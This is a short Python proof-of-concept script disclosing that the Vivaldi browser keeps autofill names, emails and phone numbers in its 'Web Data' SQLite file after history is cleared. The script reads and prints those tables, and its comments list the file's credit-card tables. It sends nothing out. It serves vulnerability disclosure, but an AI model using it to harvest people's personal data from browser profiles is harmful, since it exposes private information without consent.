#!/usr/bin/python

import sqlite3
import os

#=====================================================================================
#-The Purpose of this POC is to highlight the fact that Vivaldi Web Browser
# does not clear all data even if you check all the boxes when clearing your
# browser history. I've found that it persistantly stores personally 
# identifiable information in the (Web Data) Sqlite database.

#-I've found that 3x tables in particular cannot be erased:
#-->autofill_profile_emails
#-->autofill_profile_names
#-->autofill_profile_phones

#-Additionally it does not require any special permissions to access
#-this data.

#--This affects all versions of vivaldi < 1.14.
#--I have not tested this on Windows since i don't have windows machines and not going 
#  to download a windows vm. Someone else can test this on windows if they want.

#- Author dTwoZ3r0
#======================================================================================


#===============================================================
#---These are all of the tables inside of the Web Data database
#-autofill                   masked_credit_cards      
#-autofill_model_type_state  meta                     
#-autofill_profile_emails    payment_method_manifest  
#-autofill_profile_names     server_address_metadata  
#-autofill_profile_phones    server_addresses         
#-autofill_profiles          server_card_metadata     
#-autofill_profiles_trash    token_service            
#-autofill_sync_metadata     unmasked_credit_cards    
#-credit_cards               web_app_manifest_section 
#-keywords
#==============================================================

# - Global Variables:
#-----------------------------------------------------------------------------------------------------------------------------------
#-Declare the SQLite Tables that never get erased after clearing browsing data
temails  = 'autofill_profile_emails'
tnames   = 'autofill_profile_names'
tphones  = 'autofill_profile_phones'

#-Declare the location of the database in question
web_data = os.environ['HOME'] + "/.config/vivaldi/Default/" + "Web" + " Data"

#------------------------------------------------------------------------------------------------------------------------------------
#-Declare a few small functions to pull the 3x tables we're focusing on for this POC

def db_phones():

  #-Define database connection function
  
  conn = sqlite3.connect(web_data)
  c = conn.cursor()
  c.execute('SELECT * FROM ' + tphones)
  all_rows = c.fetchall()
  print('Phone Numbers: ', all_rows)
  
  conn.close()
#--------------------------------------------------------------------------
def db_names():

  #-Define database connection function
  
  conn = sqlite3.connect(web_data)
  c = conn.cursor()
  c.execute('SELECT * FROM ' + tnames)
  all_rows = c.fetchall()
  print('Person Names: ', all_rows)
  
  conn.close()
#------------------------------------------------------------------------
def db_emails():

  #-Define database connection function
  
  conn = sqlite3.connect(web_data)
  c = conn.cursor()
  c.execute('SELECT * FROM ' + temails)
  all_rows = c.fetchall()
  print('Emails: ', all_rows)
  
  conn.close()
#=========================================================================
def main():
  db_phones()
  db_names()
  db_emails()
#=========================================================================
if __name__ == "__main__":
  main()
